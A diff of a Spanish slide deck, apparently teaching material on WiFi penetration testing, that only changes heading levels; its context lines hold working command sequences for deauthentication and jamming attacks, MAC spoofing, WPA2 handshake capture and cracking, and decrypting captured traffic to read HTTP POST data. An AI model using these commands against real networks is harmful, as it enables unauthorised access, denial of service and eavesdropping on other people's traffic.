@@ -19,9 +19,9 @@ author: Felipe Canales Cayuqueo
 paginate: true
 ---
 
-# Modo monitor
+## Modo monitor
 
-## Inicio
+### Inicio
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -113,7 +113,7 @@ wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
 
 ```
 
-## Apagado
+### Apagado
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -159,7 +159,7 @@ wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
 Restarting networking (via systemctl): networking.service.  
 ```
 
-# Falsificación del MAC
+## Falsificación del MAC
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -181,22 +181,22 @@ Permanent MAC: 00:cf:ba:91:36:9e (ALFA, INC.)
 └──╼ ifconfig wlan0mon up
 ```
 
-# Captura de paquetes
+## Captura de paquetes
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
 └──╼ airodump-ng wlan0mon
 ```
 
-# Filtros con Airodump
+## Filtros con Airodump
 
-## Por canal
+### Por canal
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
 └──╼ airodump-ng -c 5 wlan0mon
 ```
 
-## Por ESSID
+### Por ESSID
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
 └──╼ airodump-ng --essid Testing wlan0mon
@@ -206,7 +206,7 @@ Permanent MAC: 00:cf:ba:91:36:9e (ALFA, INC.)
 └──╼ airodump-ng -c 5 --essid Testing wlan0mon
 ```
 
-## Por BSSID
+### Por BSSID
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
 └──╼ airodump-ng --bssid D8:5D:4C:FF:CC:5A wlan0mon
@@ -215,7 +215,7 @@ Permanent MAC: 00:cf:ba:91:36:9e (ALFA, INC.)
 ┌─[root@kali]─[/Documents/WiFi/]
 └──╼ airodump-ng -c 5 --bssid D8:5D:4C:FF:CC:5A wlan0mon
 ```
-# Exportación de evidencia
+## Exportación de evidencia
 
 ```bash
 # Se realiza con el parámetro -w
@@ -223,7 +223,7 @@ Permanent MAC: 00:cf:ba:91:36:9e (ALFA, INC.)
 └──╼ airodump-ng -c 5 -w nombre --bssid D8:5D:4C:FF:CC:5A wlan0mon 
 ```
 
-# Ataque de deautenticación dirigido
+## Ataque de deautenticación dirigido
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -237,7 +237,7 @@ Permanent MAC: 00:cf:ba:91:36:9e (ALFA, INC.)
 | -c | Cliente (MAC del dispositivo conectado a la red). |
 
 
-# Ataque de deautenticación global (Broadcast MAC Address)
+## Ataque de deautenticación global (Broadcast MAC Address)
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -246,7 +246,7 @@ Permanent MAC: 00:cf:ba:91:36:9e (ALFA, INC.)
 # si en vez de 10 colocamos un 0, ningún dispositivo se podrá volver a autenticar hasta que sea cancelado el ataque.
 ```
 
-# Ataque de falsa autenticación
+## Ataque de falsa autenticación
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -259,7 +259,7 @@ Permanent MAC: 00:cf:ba:91:36:9e (ALFA, INC.)
 | -a | BSSID. |
 | -h | Dirección MAC falsa. (se pueden extraer de macchanger -l) |
 
-# CTS Frame Attack
+## CTS Frame Attack
 
 La finalidad es que el cliente se desconecte y vuelva a conectarse.
 
@@ -268,14 +268,14 @@ La finalidad es que el cliente se desconecte y vuelva a conectarse.
 └──╼ tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==28" 2>/dev/null 
 ```
 
-## Filtrar en JSON
+### Filtrar en JSON
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
 └──╼ tshark -r Captura-03.cap -Y "wlan.fc.type_subtype==28" -Tjson 2>/dev/null #Tramas CTS (Clear-to-send)
 ```
 
-## Filtrar por microsegundos y sin repeticiones
+### Filtrar por microsegundos y sin repeticiones
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -387,7 +387,7 @@ Y se verá de la siguiente forma:
 | -a | Envía tramas de autenticación a todos los AP que se encuentran en el rango. |
 | -c | Seleccione un canal. |
 
-# Ataque disassociation amok mode
+## Ataque disassociation amok mode
 
 Creamos una "blacklist" con las MAC que queremos desautenticar:
 
@@ -406,14 +406,14 @@ Luego ejecutamos el ataque:
 Periodically re-reading blacklist/whitelist every 3 seconds
 ```
 
-# Ataque Michael Shutdown Exploitation (Funciona solo en routers muy antiguos)
+## Ataque Michael Shutdown Exploitation (Funciona solo en routers muy antiguos)
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
 └──╼ mdk3 wlan0mon m -t D8:5D:4C:FF:CC:5A
 ```
 
-# Detectar handshake con pyrit
+## Detectar handshake con pyrit
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -422,7 +422,7 @@ Periodically re-reading blacklist/whitelist every 3 seconds
 ```
 
 
-# Extracción del hash en el handshake con aircrack
+## Extracción del hash en el handshake con aircrack
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -436,7 +436,7 @@ Se extrae con 2John realizando lo siguiente:
 └──╼ hccap2john miCaptura.hccap > Hash 
 ```
 
-# Fuerza bruta con John The Ripper para obtener la contraseña de la red
+## Fuerza bruta con John The Ripper para obtener la contraseña de la red
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -469,7 +469,7 @@ Testing:Hello123:18874049b807:d85d4cffcc5a:d85d4cffcc5a::WPA2:miCaptura.hccap
 1 password hash cracked, 0 left
 ```
 
-# Fuerza bruta con Aircrack para obtener la contraseña de la red
+## Fuerza bruta con Aircrack para obtener la contraseña de la red
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -496,7 +496,7 @@ Testing:Hello123:18874049b807:d85d4cffcc5a:d85d4cffcc5a::WPA2:miCaptura.hccap
       EAPOL HMAC     : B5 CA CB CB A0 02 7F A8 3E A7 B1 DF 00 BF 28 43 
 ```
 
-# Cracking con Pyrit
+## Cracking con Pyrit
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -515,7 +515,7 @@ Tried 100005 PMKs so far; 2237 PMKs per second. datalife
 The password is 'Hello123'.
 ```
 
-# Cracking con Cowpatty
+## Cracking con Cowpatty
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -534,7 +534,7 @@ key no. 5000: hennessy
 
 ```
 
-# Ataque hcxdumptool
+## Ataque hcxdumptool
 
 ```bash
 ┌─[root@kali]─[/opt/xerosploit]
@@ -547,7 +547,7 @@ key no. 5000: hennessy
 ```
 
 
-# Cracking con Airolib
+## Cracking con Airolib
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -578,7 +578,7 @@ Batch processing... #Este paso demora bastante, ya que está cargando el diccion
 # La fuerza bruta será mucho más rápido de lo normal.
 ```
 
-# Creación de una Rainbow Table con GenPMK
+## Creación de una Rainbow Table con GenPMK
 
 Este proceso hará extremadamente rápido el proceso de fuerza bruta.
 
@@ -595,7 +595,7 @@ Este proceso hará extremadamente rápido el proceso de fuerza bruta.
 └──╼ pyrit -e Testing -i dic.genpmk -r Captura-01.cap attack_cowpatty
 ```
 
-# Cracking con Pyrit a través de ataque por base de datos
+## Cracking con Pyrit a través de ataque por base de datos
 
 Este ataque de fuerza bruta es el más rápido de todos.
 
@@ -613,7 +613,7 @@ Este ataque de fuerza bruta es el más rápido de todos.
 └──╼ pyrit -r Captura-01.cap atack_db
 ```
 
-# Desencriptado de paquetes con Airdecap (espionaje)
+## Desencriptado de paquetes con Airdecap (espionaje)
 
 ```bash
 ┌─[root@kali]─[/Documents/WiFi/]
@@ -639,7 +639,7 @@ Este ataque de fuerza bruta es el más rápido de todos.
 └──╼ tshark -r Captura-01-dec.cap -Y "http.request.method==POST" -Tfields -e http.file_data 2>/dev/null
 ```
 
-# Reemplazado de imágenes web con Xerosploit
+## Reemplazado de imágenes web con Xerosploit
 
 ```bash
 ┌─[root@kali]─[/opt/xerosploit]
